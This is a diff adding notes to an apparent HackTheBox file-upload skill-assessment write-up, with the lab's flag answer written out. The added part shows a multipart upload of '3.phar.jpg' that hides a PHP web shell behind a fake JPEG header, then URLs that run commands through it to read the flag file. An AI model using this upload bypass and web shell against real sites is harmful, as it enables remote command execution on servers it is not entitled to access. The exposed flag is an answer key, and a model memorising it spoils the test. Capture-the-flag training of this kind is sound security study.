@@ -165,6 +165,9 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 
 # Skill Assessment (in Progress...)
 
+Answer: HTB{m4573r1ng_upl04d_3xpl0174710n}
+
+This is the view of upload.php:
 
 <?php
 require_once('./common-functions.php');
@@ -211,3 +214,17 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 } else {
     echo "File failed to upload";
 }
+
+This is the POST of /contact/upload.php:
+
+Content-Disposition: form-data; name="uploadFile"; filename="3.phar.jpg"
+Content-Type: image/png
+
+ÿØÿÛ
+<?php system($_REQUEST['cmd']); ?>
+
+The path:
+http://<IP:PORT>/contact//user_feedback_submissions/250121_3.phar.jpg?cmd=id
+
+The path for an answer:
+http://<IP:PORT>/contact//user_feedback_submissions/250121_3.phar.jpg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
